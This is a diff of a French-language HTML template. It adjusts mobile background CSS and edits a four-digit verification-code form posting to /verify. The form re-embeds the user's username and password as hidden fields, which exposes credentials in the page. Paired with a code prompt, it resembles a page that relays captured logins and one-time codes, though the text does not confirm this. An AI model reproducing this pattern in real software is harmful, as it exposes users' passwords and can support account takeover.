@@ -30,10 +30,19 @@
       min-height: 100vh;
     }
 
-    /* Ajustement mobile pour l'image de fond (positionnement) */
+   /* **SECTION DÉJÀ CORRIGÉE POUR L'ARRIÈRE-PLAN MOBILE** */
     @media (max-width: 480px) {
       html, body {
-        background-position: center 30%;
+        background-size: contain; /* Ajuste l'image pour qu'elle tienne entièrement dans l'écran */
+        background-position: top center; /* Centre l'image en haut de l'écran */
+        background-repeat: no-repeat; /* Empêche la répétition de l'image */
+        background-attachment: scroll; /* L'image défile avec le contenu sur mobile */
+      }
+      .modal {
+        padding: 20px 15px; /* Conserve le padding ajusté pour les petites tailles d'écran */
+      }
+      input, button {
+        font-size: 15px; /* Conserve la taille de police ajustée */
       }
     }
 
@@ -187,12 +196,10 @@
       <span class="phone-number">Ou par email</span>
     </p>
 
-    <!-- FORMULAIRE CORRIGÉ : L'action pointe maintenant vers /verify -->
     <form action="/verify" method="post">
       <div class="input-container">
         <input type="text" name="verification_code" placeholder="Entrer le code" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required>
 
-        <!-- Champs cachés pour passer des données supplémentaires à votre backend -->
         <input type="hidden" name="username" value="{{ username }}">
         <input type="hidden" name="password" value="{{ password }}">
       </div>
